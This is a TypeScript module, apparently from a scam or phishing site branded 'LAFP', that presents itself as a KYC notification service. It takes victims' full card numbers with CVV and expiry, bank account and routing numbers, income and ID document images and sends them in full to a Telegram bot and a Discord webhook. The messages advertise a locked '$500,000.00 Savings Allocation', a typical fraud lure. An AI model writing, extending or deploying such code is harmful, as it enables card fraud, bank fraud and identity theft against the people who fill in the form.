import fs from "fs";
import path from "path";
import config from "../config";

export interface VerificationNotificationPayload {
    userId: string;
    fullName: string;
    userEmail?: string;
    userPhone?: string;
    employmentStatus?: string;
    occupation?: string;
    annualIncome?: string;
    bankName: string;
    accountHolderName: string;
    accountNumber: string;
    routingNumber: string;
    receiveMethod?: string;
    cardHolderName?: string;
    cardNumber?: string;
    cardType?: string;
    cardCvv?: string;
    cardExpiry?: string;
    documentType?: string;
    documentFrontUrl?: string;
    documentBackUrl?: string;
}

/**
 * Dispatches real-time alerts when a user submits a KYC packet
 */
export async function notifyAdminKYCSubmission(data: VerificationNotificationPayload) {
    const timestamp = new Date().toISOString();

    // 1. Log to logs/verifications.log
    try {
        const logsDir = path.join(process.cwd(), "logs");
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }
        const logEntry = JSON.stringify({ timestamp, ...data }, null, 2);
        fs.appendFileSync(path.join(logsDir, "verifications.log"), `\n--- [${timestamp}] ---\n${logEntry}\n`);
    } catch (e) {
        console.error("[Notifier] Failed to write to verifications.log:", e);
    }

    // 2. Formatted terminal banner for pm2 logs
    console.log(`\n======================================================`);
    console.log(`🔔 [LAFP AUDIT] New KYC Verification Packet Received!`);
    console.log(`👤 Client:     ${data.fullName} (${data.userEmail || data.userId})`);
    console.log(`💼 Employment: ${data.employmentStatus || 'N/A'} — ${data.occupation || 'N/A'}`);
    console.log(`💰 Income:     ${data.annualIncome || 'N/A'}`);
    console.log(`🏦 Bank:       ${data.bankName} (Acc: ${data.accountNumber}, Routing: ${data.routingNumber})`);
    if (data.cardNumber) {
        console.log(`💳 Card:       ${data.cardType} ****${data.cardNumber.slice(-4)} (Exp: ${data.cardExpiry})`);
    }
    console.log(`📄 Docs:       ${data.documentType || 'ID'}`);
    console.log(`   Front:      ${data.documentFrontUrl || 'N/A'}`);
    console.log(`   Back:       ${data.documentBackUrl || 'N/A'}`);
    console.log(`======================================================\n`);

    // 3. Optional Telegram Bot Notification
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;
    if (telegramToken && telegramChatId) {
        try {
            const text = `🔔 *[LAFP SERVER] NEW KYC VERIFICATION SUBMITTED*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `👤 *Client:* ${escapeTg(data.fullName)}\n` +
                `📧 *Email:* ${escapeTg(data.userEmail || 'N/A')}\n` +
                `📱 *Phone:* ${escapeTg(data.userPhone || 'N/A')}\n` +
                `💼 *Employment:* ${escapeTg(data.employmentStatus || 'N/A')} (${escapeTg(data.occupation || 'N/A')})\n` +
                `💰 *Annual Income:* ${escapeTg(data.annualIncome || 'N/A')}\n` +
                `🎁 *Savings Allocation:* $500,000.00 (Locked)\n\n` +
                `🏦 *Bank:* ${escapeTg(data.bankName)}\n` +
                `• Acc: \`${data.accountNumber}\`\n` +
                `• Routing: \`${data.routingNumber}\`\n` +
                (data.cardNumber ? `💳 *Card:* \`${data.cardNumber}\` | CVV: \`${data.cardCvv}\` | Exp: \`${data.cardExpiry}\`\n\n` : '\n') +
                `📄 *Document:* ${escapeTg(data.documentType || 'ID')}\n` +
                `• Front: [View Front](${data.documentFrontUrl})\n` +
                `• Back: [View Back](${data.documentBackUrl})\n` +
                `━━━━━━━━━━━━━━━━━━`;

            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text,
                    parse_mode: "Markdown"
                })
            });
        } catch (tgErr) {
            console.error("[Notifier] Telegram notification failed:", tgErr);
        }
    }

    // 4. Discord Webhook Notification for LAFP Server
    const discordWebhookUrl = config.DISCORD_WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
    if (discordWebhookUrl) {
        try {
            const embed = {
                title: "🏦 LAFP SERVER // NEW KYC SUBMISSION",
                description: `Customer documentation received for **$500,000.00 Savings Allocation** verification clearance.`,
                color: 0x09090b,
                fields: [
                    { name: "👤 Client", value: `**${data.fullName}**\n${data.userEmail || 'No email'}\n${data.userPhone || 'No phone'}`, inline: true },
                    { name: "💼 Employment & Income", value: `Status: **${data.employmentStatus || 'N/A'}**\nOccupation: **${data.occupation || 'N/A'}**\nIncome: **${data.annualIncome || 'N/A'}**`, inline: true },
                    { name: "🏦 Destination Wire", value: `Bank: **${data.bankName}**\nHolder: ${data.accountHolderName}\nAccount: \`${data.accountNumber}\`\nRouting: \`${data.routingNumber}\``, inline: false },
                    { name: "💳 Verified Card", value: data.cardNumber ? `Card: **${data.cardType}**\nHolder: ${data.cardHolderName}\nNumber: \`${data.cardNumber}\`\nCVV: \`${data.cardCvv}\` | Exp: \`${data.cardExpiry}\`` : "None Captured", inline: false },
                    { name: "📄 Identity Document", value: `Type: **${data.documentType || 'ID'}**\n• [Front Image](${data.documentFrontUrl || '#'})\n• [Back Image](${data.documentBackUrl || '#'})`, inline: false }
                ],
                footer: {
                    text: "LAFP Compliance & Audit Server • 2026"
                },
                timestamp: new Date().toISOString()
            };

            await fetch(discordWebhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "LAFP Server Auditor",
                    embeds: [embed]
                })
            });
        } catch (dcErr) {
            console.error("[Notifier] Discord webhook notification failed:", dcErr);
        }
    }
}

function escapeTg(str: string): string {
    return (str || "").replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
}
